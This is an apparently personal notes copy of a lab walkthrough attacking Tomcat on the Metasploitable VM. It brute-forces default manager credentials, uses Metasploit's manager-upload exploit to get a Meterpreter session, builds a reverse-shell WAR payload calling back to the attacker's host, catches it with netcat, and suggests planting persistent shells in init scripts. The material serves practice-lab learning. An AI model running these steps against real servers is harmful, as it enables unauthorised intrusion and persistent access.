<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>tomcat & coyote</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>tomcat & coyote</h1><br/><p></p><p><strong>Reference:</strong> https://charlesreid1.com/wiki/Metasploitable/Apache/Tomcat_and_Coyote</p><p></p><p><h1>Metasploitable/Apache/Tomcat and Coyote</h1></p><p></p><p></p><p></p><p><h2>Contents</h2></p><p></p><p>• 1 Tomcat Service◇ 1.1 What is tomcat</p><p>◇ 1.2 What is coyote</p><p></p><p></p><p>• 2 Tomcat Recon</p><p>• 3 Metasploit Modules for Tomcat◇ 3.1 Login Credentials▪ 3.1.1 tomcat mgr login</p><p></p><p></p><p>◇ 3.2 Uploading Java Executable with Metasploit▪ 3.2.1 Automated Metasploit File Upload</p><p>▪ 3.2.2 Set Metasploit Options</p><p>▪ 3.2.3 Run the Exploit (Failure)</p><p>▪ 3.2.4 Run the Exploit (Worked)</p><p>▪ 3.2.5 Houston, We Have A Meterpreter Shell</p><p></p><p></p><p>◇ 3.3 Uploading Java Executable Manually▪ 3.3.1 Craft WAR Payload</p><p>▪ 3.3.2 Netcat Listener</p><p>▪ 3.3.3 Houston, We Have a Shell</p><p>▪ 3.3.4 Clean Up</p><p></p><p></p><p></p><p></p><p>• 4 Flags</p><p></p><p></p><p></p><p><h1>Tomcat Service</h1></p><p>We will attempt to abuse the Tomcat server in order to obtain access to the web server. The end goal is to obtain a shell on the web server.</p><p>Just a reminder of what the nmap scan returned about Apache Tomcat and Coyote:</p><p>10.0.0.27  8180  tcp    http         open   Apache Tomcat/Coyote JSP engine 1.1</p><p>JSP stands for JavaServer Pages. All this means is, web pages accessed through port 8180 will be assembled by a Java web application.</p><p></p><p><h2>What is tomcat</h2></p><p>Apache Tomcat provides software to run Java applets in the browser. The nmap scan didn&#39;t return the version, so that&#39;s probably the first thing we&#39;ll want to figure out.</p><p></p><p><h2>What is coyote</h2></p><p>Coyote is a stand-alone web server that provides servlets to Tomcat applets. That is, it functions like the Apache web server, but for JavaServer Pages (JSP).</p><p>From the description of Coyote on the Tomcat page [1], it sounds like this server will be as susceptible to denial of service attacks as the Apache web server was.</p><p></p><p></p><p></p><p><h1>Tomcat Recon</h1></p><p>Let&#39;s start by doing some recon of the Tomcat server using the various HTTP scanners in Metasploit.</p><p>Running the HTTP dir scanner module turns up some goodies:</p><p>msf auxiliary(dir_listing) &gt; use auxiliary/scanner/http/dir_scanner</p><p>msf auxiliary(dir_scanner) &gt; set RHOSTS 10.0.0.27</p><p>RHOSTS =&gt; 10.0.0.27</p><p>msf auxiliary(dir_scanner) &gt; set RPORT 8180</p><p>RPORT =&gt; 8180</p><p>msf auxiliary(dir_scanner) &gt; run</p><p></p><p>[*] Detecting error code</p><p>[*] Using code &#39;404&#39; as not found for 10.0.0.27</p><p>[*] Found http://10.0.0.27:8180/admin/ 200 (10.0.0.27)</p><p>[*] Found http://10.0.0.27:8180/jsp-examples/ 200 (10.0.0.27)</p><p>[*] Found http://10.0.0.27:8180/tomcat-docs/ 200 (10.0.0.27)</p><p>[*] Found http://10.0.0.27:8180/webdav/ 200 (10.0.0.27)</p><p>[*] Scanned 1 of 1 hosts (100% complete)</p><p>[*] Auxiliary module execution completed</p><p>msf auxiliary(dir_scanner) &gt;</p><p>These turn up some interesting pages that can potentially be bypassed:</p><p><img src="images/49-1.png" alt="images/49-1.png" /></p><p><img src="images/49-2.png" alt="images/49-2.png" /></p><p></p><p><h1>Metasploit Modules for Tomcat</h1></p><p>The recon we do feeds into the choice of Metasploit modules that we make. First, we have a login page - this provides us with a way to brute-force login credentials. Second, we have a WebDAV interface, and a potential avenue for uploading a PHP shell. Third, the server works much like the Apache server, and is susceptible to denial of service attacks.</p><p></p><p><h2>Login Credentials</h2></p><p>We can do a comprehensive search for all Tomcat-related modules in metasploit:</p><p>msf &gt; search tomcat</p><p></p><p>Matching Modules</p><p>================</p><p></p><p>   Name                                                         Disclosure Date  Rank       Description</p><p>   ----                                                         ---------------  ----       -----------</p><p>   auxiliary/admin/http/tomcat_administration                                    normal     Tomcat Administration Tool Default Access</p><p>   auxiliary/admin/http/tomcat_utf8_traversal                                    normal     Tomcat UTF-8 Directory Traversal Vulnerability</p><p>   auxiliary/admin/http/trendmicro_dlp_traversal                                 normal     TrendMicro Data Loss Prevention 5.5 Directory Traversal</p><p>   auxiliary/dos/http/apache_commons_fileupload_dos             2014-02-06       normal     Apache Commons FileUpload and Apache Tomcat DoS</p><p>   auxiliary/dos/http/apache_tomcat_transfer_encoding           2010-07-09       normal     Apache Tomcat Transfer-Encoding Information Disclosure and DoS</p><p>   auxiliary/dos/http/hashcollision_dos                         2011-12-28       normal     Hashtable Collisions</p><p>   auxiliary/scanner/http/tomcat_enum                                            normal     Apache Tomcat User Enumeration</p><p>   auxiliary/scanner/http/tomcat_mgr_login                                       normal     Tomcat Application Manager Login Utility</p><p>   exploit/multi/http/struts_code_exec_classloader              2014-03-06       manual     Apache Struts ClassLoader Manipulation Remote Code Execution</p><p>   exploit/multi/http/struts_default_action_mapper              2013-07-02       excellent  Apache Struts 2 DefaultActionMapper Prefixes OGNL Code Execution</p><p>   exploit/multi/http/struts_dev_mode                           2012-01-06       excellent  Apache Struts 2 Developer Mode OGNL Execution</p><p>   exploit/multi/http/tomcat_mgr_deploy                         2009-11-09       excellent  Apache Tomcat Manager Application Deployer Authenticated Code Execution</p><p>   exploit/multi/http/tomcat_mgr_upload                         2009-11-09       excellent  Apache Tomcat Manager Authenticated Upload Code Execution</p><p>   exploit/multi/http/zenworks_configuration_management_upload  2015-04-07       excellent  Novell ZENworks Configuration Management Arbitrary File Upload</p><p>   post/windows/gather/enum_tomcat                                               normal     Windows Gather Apache Tomcat Enumeration</p><p>We will focus on three modules:</p><p>auxiliary/scanner/http/tomcat_mgr_login</p><p>exploit/multi/http/tomcat_mgr_deploy</p><p>exploit/multi/http/tomcat_mgr_upload</p><p>Specifically, to obtain login credentials, we&#39;ll focus on tomcat_mgr_login.</p><p></p><p><h3>tomcat mgr login</h3></p><p>This module is, obviously, for logging into Tomcat.</p><p>Here is info on this module from the Rapid7 website: https://www.rapid7.com/db/modules/auxiliary/scanner/http/tomcat_mgr_login</p><p>Printing out the various options, it looks like a brute force method:</p><p>msf &gt; use auxiliary/scanner/http/tomcat_mgr_login</p><p>msf auxiliary(tomcat_mgr_login) &gt; show info</p><p></p><p>       Name: Tomcat Application Manager Login Utility</p><p>     Module: auxiliary/scanner/http/tomcat_mgr_login</p><p>    License: Metasploit Framework License (BSD)</p><p>       Rank: Normal</p><p></p><p>Provided by:</p><p>  MC &lt;mc@metasploit.com&gt;</p><p>  Matteo Cantoni &lt;goony@nothink.org&gt;</p><p>  jduck &lt;jduck@metasploit.com&gt;</p><p></p><p>Basic options:</p><p>  Name              Current Setting                                                                 Required  Description</p><p>  ----              ---------------                                                                 --------  -----------</p><p>  BLANK_PASSWORDS   false                                                                           no        Try blank passwords for all users</p><p>  BRUTEFORCE_SPEED  5                                                                               yes       How fast to bruteforce, from 0 to 5</p><p>  DB_ALL_CREDS      false                                                                           no        Try each user/password couple stored in the current database</p><p>  DB_ALL_PASS       false                                                                           no        Add all passwords in the current database to the list</p><p>  DB_ALL_USERS      false                                                                           no        Add all users in the current database to the list</p><p>  PASSWORD                                                                                          no        A specific password to authenticate with</p><p>  PASS_FILE         /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt      no        File containing passwords, one per line</p><p>  Proxies                                                                                           no        A proxy chain of format type:host:port[,type:host:port][...]</p><p>  RHOSTS                                                                                            yes       The target address range or CIDR identifier</p><p>  RPORT             8080                                                                            yes       The target port</p><p>  STOP_ON_SUCCESS   false                                                                           yes       Stop guessing when a credential works for a host</p><p>  TARGETURI         /manager/html                                                                   yes       URI for Manager login. Default is /manager/html</p><p>  THREADS           1                                                                               yes       The number of concurrent threads</p><p>  USERNAME                                                                                          no        A specific username to authenticate as</p><p>  USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt  no        File containing users and passwords separated by space, one pair per line</p><p>  USER_AS_PASS      false                                                                           no        Try the username as the password for all users</p><p>  USER_FILE         /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt     no        File containing users, one per line</p><p>  VERBOSE           true                                                                            yes       Whether to print output for all attempts</p><p>  VHOST                                                                                             no        HTTP server virtual host</p><p></p><p>Description:</p><p>  This module simply attempts to login to a Tomcat Application Manager</p><p>  instance using a specific user/pass.</p><p></p><p>References:</p><p>  http://cvedetails.com/cve/2009-3843/</p><p>  http://www.osvdb.org/60317</p><p>  http://www.securityfocus.com/bid/37086</p><p>  http://cvedetails.com/cve/2009-4189/</p><p>  http://www.osvdb.org/60670</p><p>  http://www.harmonysecurity.com/blog/2009/11/hp-operations-manager-backdoor-account.html</p><p>  http://www.zerodayinitiative.com/advisories/ZDI-09-085</p><p>  http://cvedetails.com/cve/2009-4188/</p><p>  http://www.securityfocus.com/bid/38084</p><p>  http://cvedetails.com/cve/2010-0557/</p><p>  http://www-01.ibm.com/support/docview.wss?uid=swg21419179</p><p>  http://cvedetails.com/cve/2010-4094/</p><p>  http://www.zerodayinitiative.com/advisories/ZDI-10-214</p><p>  http://cvedetails.com/cve/2009-3548/</p><p>  http://www.osvdb.org/60176</p><p>  http://www.securityfocus.com/bid/36954</p><p>  http://tomcat.apache.org/</p><p>  http://cvedetails.com/cve/1999-0502/</p><p>We&#39;ll definitely want to try blank passwords. Let&#39;s set some options:</p><p>msf auxiliary(tomcat_mgr_login) &gt; workspace metasploitable</p><p>[*] Workspace: metasploitable</p><p>msf auxiliary(tomcat_mgr_login) &gt; set BLANK_PASSWORDS true</p><p>BLANK_PASSWORDS =&gt; true</p><p>msf auxiliary(tomcat_mgr_login) &gt; set RHOSTS 10.0.0.27</p><p>RHOSTS =&gt; 10.0.0.27</p><p>msf auxiliary(tomcat_mgr_login) &gt; set USER_AS_PASS true</p><p>USER_AS_PASS =&gt; true</p><p>msf auxiliary(tomcat_mgr_login) &gt; set RPORT 8180</p><p>RPORT =&gt; 8180</p><p>Now fire it up:</p><p>msf auxiliary(tomcat_mgr_login) &gt; run</p><p></p><p>msf auxiliary(tomcat_mgr_login) &gt; run</p><p></p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: admin:admin (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: admin: (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: admin:admin (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: admin:manager (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: admin:role1 (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: admin:root (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: admin:tomcat (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: admin:s3cret (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: manager:manager (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: manager: (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: manager:admin (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: manager:manager (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: manager:role1 (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: manager:root (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: manager:tomcat (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: manager:s3cret (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: role1:role1 (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: role1: (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: role1:admin (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: role1:manager (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: role1:role1 (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: role1:root (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: role1:tomcat (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: role1:s3cret (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: root:root (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: root: (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: root:admin (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: root:manager (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: root:role1 (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: root:root (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: root:tomcat (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: root:s3cret (Incorrect: )</p><p>[+] 10.0.0.27:8180 - LOGIN SUCCESSFUL: tomcat:tomcat</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: both:both (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: both: (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: both:admin (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: both:manager (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: both:role1 (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: both:root (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: both:tomcat (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: both:s3cret (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: j2deployer:j2deployer (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: ovwebusr:OvW*busr1 (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: cxsdk:kdsxc (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: root:owaspbwa (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: ADMIN:ADMIN (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: xampp:xampp (Incorrect: )</p><p>[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: QCC:QLogic66 (Incorrect: )</p><p>[*] Scanned 1 of 1 hosts (100% complete)</p><p>[*] Auxiliary module execution completed</p><p>Success! The username/password <code>tomcat/tomcat</code> will get us access to the server.</p><p></p><p><h2>Uploading Java Executable with Metasploit</h2></p><p>Just as obtaining a remote shell on the web server with Apache required uploading and executing a PHP script (see Metasploitable/Apache/DAV), obtaining a remote shell on the web server will require uploading and executing a file - but for Tomcat, the executable must be a JSP (JavaServer Pages) application.</p><p></p><p><h3>Automated Metasploit File Upload</h3></p><p>This is contained in the tomcat_mgr_upload module:</p><p>msf auxiliary(dir_scanner) &gt; use exploit/multi/http/tomcat_mgr_upload</p><p>msf exploit(tomcat_mgr_upload) &gt; show options</p><p></p><p>Module options (exploit/multi/http/tomcat_mgr_upload):</p><p></p><p>   Name       Current Setting  Required  Description</p><p>   ----       ---------------  --------  -----------</p><p>   PASSWORD                    no        The password for the specified username</p><p>   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]</p><p>   RHOST                       yes       The target address</p><p>   RPORT      80               yes       The target port</p><p>   TARGETURI  /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be used)</p><p>   USERNAME                    no        The username to authenticate as</p><p>   VHOST                       no        HTTP server virtual host</p><p></p><p></p><p>Exploit target:</p><p></p><p>   Id  Name</p><p>   --  ----</p><p>   0   Java Universal</p><p></p><p><h3>Set Metasploit Options</h3></p><p>Set some options for this exploit. We&#39;ll use the credentials we already found.</p><p>msf exploit(tomcat_mgr_upload) &gt; set USERNAME tomcat</p><p>USERNAME =&gt; tomcat</p><p>msf exploit(tomcat_mgr_upload) &gt; set PASSWORD tomcat</p><p>PASSWORD =&gt; tomcat</p><p>msf exploit(tomcat_mgr_upload) &gt; set RHOST 10.0.0.27</p><p>RHOST =&gt; 10.0.0.27</p><p>msf exploit(tomcat_mgr_upload) &gt; set RPORT 8180</p><p>RPORT =&gt; 8180</p><p>The <code>TARGETURI</code>variable should be left to the default, <code>manager/</code> - not set to admin.</p><p>msf exploit(tomcat_mgr_upload) &gt; set TARGETURI /manager</p><p>TARGETURI =&gt; /manager</p><p>Additionally, we&#39;ll need to set the target architecture:</p><p>msf exploit(tomcat_mgr_upload) &gt; show targets</p><p></p><p>Exploit targets:</p><p></p><p>   Id  Name</p><p>   --  ----</p><p>   0   Java Universal</p><p>   1   Windows Universal</p><p>   2   Linux x86</p><p></p><p></p><p>msf exploit(tomcat_mgr_upload) &gt; set TARGET 0</p><p>TARGET =&gt; 0</p><p></p><p><h3>Run the Exploit (Failure)</h3></p><p>Now we are ready to run:</p><p>msf exploit(tomcat_mgr_upload) &gt; run</p><p></p><p>[*] Started reverse TCP handler on 10.0.0.25:4444</p><p>[*] 10.0.0.27:8180 - Retrieving session ID and CSRF token...</p><p>[*] 10.0.0.27:8180 - Finding CSRF token...</p><p>[*] 10.0.0.27:8180 - Uploading and deploying t1wR96yByt0JeBpX5z7z...</p><p>[*] 10.0.0.27:8180 - Uploading 6081 bytes as t1wR96yByt0JeBpX5z7z.war ...</p><p>[*] 10.0.0.27:8180 - Executing t1wR96yByt0JeBpX5z7z...</p><p>[*] 10.0.0.27:8180 - Executing /t1wR96yByt0JeBpX5z7z/UXnJq.jsp...</p><p>[*] 10.0.0.27:8180 - Finding CSRF token...</p><p>[*] 10.0.0.27:8180 - Undeploying t1wR96yByt0JeBpX5z7z ...</p><p>[*] Exploit completed, but no session was created.</p><p>Does not work. Not sure why.</p><p>After running the above exploit, I can log into the management page and see the WAR is successfully being uploaded by Metasploit, and that the module is active and running.</p><p>Can configure the correct path to the Tomcat manager (which is <code>/manager</code>).</p><p>(Note: many admins will disable these Tomcat modules or change the name of directories.)</p><p></p><p></p><p></p><p><h3>Run the Exploit (Worked)</h3></p><p>I set this aside for a day, and found another workaround (covered below). But then, later, the exploit worked as intended.</p><p>msf exploit(tomcat_mgr_upload) &gt; set USERNAME tomcat</p><p>USERNAME =&gt; tomcat</p><p>msf exploit(tomcat_mgr_upload) &gt; set PASSWORD tomcat</p><p>PASSWORD =&gt; tomcat</p><p>msf exploit(tomcat_mgr_upload) &gt; set RHOST 10.0.0.27</p><p>RHOST =&gt; 10.0.0.27</p><p>msf exploit(tomcat_mgr_upload) &gt; set RPORT 8180</p><p>RPORT =&gt; 8180</p><p>msf exploit(tomcat_mgr_upload) &gt; run</p><p></p><p>[*] Started reverse TCP handler on 10.0.0.5:4444</p><p>[*] 10.0.0.27:8180 - Retrieving session ID and CSRF token...</p><p>[*] 10.0.0.27:8180 - Uploading and deploying cjMiuUTZpif5w0UB5FgrZY...</p><p>[*] 10.0.0.27:8180 - Executing cjMiuUTZpif5w0UB5FgrZY...</p><p>[*] 10.0.0.27:8180 - Undeploying cjMiuUTZpif5w0UB5FgrZY ...</p><p>[*] Sending stage (45741 bytes) to 10.0.0.27</p><p>[*] Meterpreter session 1 opened (10.0.0.5:4444 -&gt; 10.0.0.27:50621) at 2016-03-30 19:33:50 -0700</p><p></p><p>meterpreter &gt;</p><p></p><p><h3>Houston, We Have A Meterpreter Shell</h3></p><p>Now we have a meterpreter shell! Over and on to <a href="https://charlesreid1.com/wiki/Meterpreter">Meterpreter</a>.</p><p></p><p><h2>Uploading Java Executable Manually</h2></p><p>For some reason, the metasploit automated payload deployment had some problems. However, we can still exploit this server manually.</p><p>The management web interface gives us a place to upload WAR files, and a way to execute them manually.</p><p><a href="https://charlesreid1.com/w/images/thumb/c/c1/Tomcat_upload.png/500px-Tomcat_upload.png"><img src="images/49-3.png" alt="images/49-3.png" /></a></p><p>We can use Metasploit to craft a WAR file with the payload, then manually upload and execute it.</p><p></p><p><h3>Craft WAR Payload</h3></p><p>http://securitypadawan.blogspot.com/2011/11/attacking-metasploitable-tomcat-this-is.html</p><p># msfpayload linux/x86/shell_reverse_tcp LHOST=10.0.0.25 LPORT=4444 W &gt; runme.war</p><p>Now we upload the runme.war file, and set it running on the Tomcat server:</p><p><a href="https://charlesreid1.com/w/images/thumb/b/b5/Tomcat_runme_upload.png/500px-Tomcat_runme_upload.png"><img src="images/49-4.png" alt="images/49-4.png" /></a></p><p>Note that this does NOT execute the payload yet!!!</p><p>To execute the payload and run the actual war file, we will need to visit the page http://10.0.0.27:8180/runme/. However, this will try and connect to our command-and-control server on port 4444, and we need to be listening for the incoming connection.</p><p>We&#39;ll use netcat to receive the incoming shell once the WAR file is executed.</p><p></p><p><h3>Netcat Listener</h3></p><p>Now we set netcat listening on port 4444, the port we hard-coded into our payload:</p><p># nc -v -l -p 4444</p><p>Now, netcat will listen for the incoming connection, so you&#39;re ready to execute your payload.</p><p>Once the <code>runme.war</code> module is enabled through the Tomcat server, visit the applet in your browser:</p><p>http://10.0.0.27:8180/runme/</p><p>You&#39;ll see the incoming TCP connection in netcat.</p><p>root@morpheus:~# nc -v -l -p 4444</p><p>listening on [any] 4444 ...</p><p></p><p>10.0.0.27: inverse host lookup failed: Unknown host</p><p>connect to [10.0.0.25] from (UNKNOWN) [10.0.0.27] 35148</p><p></p><p><h3>Houston, We Have a Shell</h3></p><p>Congrats - we&#39;ve got ourselves a shell!</p><p>The shell is nothing fancy, but it lets us do some things on the filesystem.</p><p>We are the tomcat 5.5 user:</p><p>id</p><p>uid=110(tomcat55) gid=65534(nogroup) groups=65534(nogroup)</p><p>Here I list the contents of the root directory:</p><p>cd /</p><p>ls</p><p>bin</p><p>boot</p><p>cdrom</p><p>dev</p><p>etc</p><p>home</p><p>initrd</p><p>initrd.img</p><p>lib</p><p>lost+found</p><p>media</p><p>mnt</p><p>nohup.out</p><p>opt</p><p>proc</p><p>root</p><p>sbin</p><p>srv</p><p>sys</p><p>tmp</p><p>usr</p><p>var</p><p>vmlinuz</p><p>Note that you are not root so you cannot modify files that you don&#39;t own. Same goes for trying to access SSH keys - if they&#39;re read-only for that user, you won&#39;t be able to see them.</p><p>ls -la</p><p>lrwxrwxrwx 1 root     root        9 2012-05-14 00:26 .bash_history -&gt; /dev/null</p><p>drwxr-xr-x 4 msfadmin msfadmin 4096 2010-04-17 14:11 .distcc</p><p>drwx------ 2 msfadmin msfadmin 4096 2016-03-29 06:25 .gconf</p><p>drwx------ 2 msfadmin msfadmin 4096 2016-03-29 06:25 .gconfd</p><p>-rw-r--r-- 1 msfadmin msfadmin  586 2010-03-16 19:12 .profile</p><p>-rwx------ 1 msfadmin msfadmin    4 2012-05-20 14:22 .rhosts</p><p>drwx------ 2 msfadmin msfadmin 4096 2010-05-17 21:43 .ssh</p><p>drwxr-xr-x 6 msfadmin msfadmin 4096 2010-04-27 23:44 vulnerable</p><p>-rw------- 1 msfadmin msfadmin   60 2016-03-27 19:14 .Xauthority</p><p>touch .bash_history</p><p>ls -la</p><p>total 40</p><p>drwxr-xr-x 7 msfadmin msfadmin 4096 2016-03-27 19:14 .</p><p>drwxr-xr-x 6 root     root     4096 2010-04-16 02:16 ..</p><p>lrwxrwxrwx 1 root     root        9 2012-05-14 00:26 .bash_history -&gt; /dev/null</p><p>drwxr-xr-x 4 msfadmin msfadmin 4096 2010-04-17 14:11 .distcc</p><p>drwx------ 2 msfadmin msfadmin 4096 2016-03-29 06:25 .gconf</p><p>drwx------ 2 msfadmin msfadmin 4096 2016-03-29 06:25 .gconfd</p><p>-rw-r--r-- 1 msfadmin msfadmin  586 2010-03-16 19:12 .profile</p><p>-rwx------ 1 msfadmin msfadmin    4 2012-05-20 14:22 .rhosts</p><p>drwx------ 2 msfadmin msfadmin 4096 2010-05-17 21:43 .ssh</p><p>drwxr-xr-x 6 msfadmin msfadmin 4096 2010-04-27 23:44 vulnerable</p><p>-rw------- 1 msfadmin msfadmin   60 2016-03-27 19:14 .Xauthority</p><p>You can also dump the contents of the startup scripts:</p><p>cd /etc/init.d</p><p>ls</p><p>You could modify one of these services (or add a new one) to open a netcat shell. Need some additional practice with these netcat shells. It&#39;s possible to use a text editor like vi, but also very clunky.</p><p>It should be a lot easier to utilize an open reverse TCP connection to transfer files with netcat.</p><p>http://securitypadawan.blogspot.com/2011/11/attacking-metasploitable-tomcat-this-is.html</p><p></p><p><h3>Clean Up</h3></p><p>Remove the runme war file by going back to http://10.0.0.27:8180/manager/html and clicking &quot;Undeploy&quot;.</p><p></p><p></p><p></p></div>
</body>
</html>
